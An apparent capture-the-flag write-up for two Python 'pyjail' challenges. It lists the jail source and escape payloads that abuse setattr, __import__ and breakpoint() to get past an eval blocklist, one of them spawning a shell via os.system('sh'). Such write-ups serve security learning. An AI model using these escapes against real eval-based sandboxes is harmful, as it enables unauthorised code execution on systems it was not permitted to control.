### pyjail && revenge

```python
#!/usr/bin/env python3  
  
blocklist = ['.', '\\', '[', ']', '{', '}',':']  
DISABLE_FUNCTIONS = ["getattr", "eval", "exec", "breakpoint", "lambda", "help"]  
DISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS}  
  
print('welcome!')  
  
while True:  
    cmd = input('>>> ')  
    if any([b in cmd for b in blocklist]):  
        print('bad!')  
    else:  
        try:  
            print(eval(cmd, DISABLE_FUNCTIONS))  
        except Exception as e:  
            print(e)
```



```python
#!/usr/bin/env python3  
  
def main():  
    blocklist = ['.', '\\', '[', ']', '{', '}',':', "blocklist", "globals", "compile"]  
    DISABLE_FUNCTIONS = ["getattr", "eval", "exec", "breakpoint", "lambda", "help"]  
    DISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS}  
  
    print('welcome!')  
  
    # NO LOOP!  
  
    cmd = input('>>> ')  
    if any([b in cmd for b in blocklist]):  
        print('bad!')  
    else:  
        try:  
            print(eval(cmd, DISABLE_FUNCTIONS))  
        except Exception as e:  
            print(e)  
  
if __name__ == '__main__':  
    main()
```

`setattr(copyright,'__dict__',globals()),delattr(copyright,'breakpoint'),breakpoint()`

```python
setattr(__import__('sys'),'modules',__builtins__) or __import__('getattr')(__import__('os'),'system')('sh')
这个比较有意思sys导入builtins

setattr(__import__("__main__"), "blocklist", list())
```